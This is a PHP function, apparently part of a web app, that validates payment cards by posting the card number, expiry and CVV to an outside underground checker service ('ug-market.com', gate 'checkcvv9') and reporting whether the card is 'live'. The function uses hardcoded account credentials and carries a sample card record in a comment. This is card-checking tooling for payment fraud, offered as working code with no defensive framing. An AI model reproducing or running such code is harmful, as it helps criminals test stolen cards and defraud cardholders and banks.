<?php
include(APPPATH . 'libraries/Requests.php');
Requests::register_autoloader();

set_time_limit (0);

// 1234567898765432|09|2039|343|Yolo Dolo|3434
function checkCC($ci, $info)
{
	if(!isset($info->card_number) || !isset($info->card_exp_month) || !isset($info->card_exp_year)
		|| !isset($info->zip) || !isset($info->card_security_code)) return false;
	if(strlen($info->card_exp_month) == 4) {
		$info->card_exp_month = substr($info->card_exp_month, 0, 2);
	} elseif(strlen($info->card_exp_month) == 2
		&& substr($info->card_exp_month, 0, 1) == '0') {
		$info->card_exp_month = substr($info->card_exp_month, 1, 1);
	}

	if(strlen($info->card_exp_year) == 2) {
		$info->card_exp_year = '20' . substr($info->card_exp_year, 0, 2);
	}

	$session = new Requests_Session('http://www.ug-market.com');
	$form = array(
		'user'  => 'CardCentral',
		'pwd'  => 'ierome1995',
		'gate'  => 'checkcvv9',
		'cc'  => $info->card_number.'|'.$info->card_exp_month.'|'.$info->card_exp_year.'|'.$info->card_security_code
	);
	$request = $session->post('/ugm/xcheck.php',$form,$form);

	//if(strpos($request->body, 'UnKnow') > 0) {
	//	return $checkCC($ci, $info);
	//}

	//echo $request->body;
	//print_r($form);

	return strpos($request->body, 'Done(Live)') > 0;
}